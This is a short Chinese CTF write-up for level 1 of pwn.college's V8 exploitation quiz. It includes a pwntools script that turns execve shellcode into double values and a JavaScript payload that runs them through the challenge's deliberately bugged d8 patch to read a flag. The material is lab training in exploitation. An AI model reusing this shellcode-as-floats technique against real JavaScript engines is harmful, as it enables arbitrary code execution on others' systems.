## Practice-Pwncollege

https://pwn.college/quarterly-quiz/v8-exploitation 提供了一些练习，需要注册账号。每道题目都有start和practice选项，区别在于practice提供的环境可以用sudo。我刚开始没意识到这点，准备调试d8的时候提示permission denied。加个sudo就解决了

题目提供的环境自带pwndbg，不过要用`pwndbg`命令唤起，而不是`gdb`。环境的workspace和desktop是互通的，在workspace里改动的文件能在desktop里看到，反之亦然

### level1

整个patch文件都是bug，将double数组里的元素拷贝到mmap的一块rwx内存后执行。直接生成shellcode后转成double类型即可
```py
from pwn import *
import struct
context.arch='amd64'
shellcode=asm(shellcraft.execve('/challenge/catflag', 0, 0))
exp=[]
for i in range(0,len(shellcode),8):
    exp.append(struct.unpack('d', shellcode[i:i+8].ljust(8,b'\x00'))[0])
print(exp)
```
```js
let shellcode=[2.820972645905851e-134, 3.0758087950517603e+180, 2.2354425876138794e+40, 3.68572438550025e+180, 1.054512194375715e-68, 2.748715909248e-311];
shellcode.run();
```
注意shellcode要执行题目自带的`catflag`而不是sh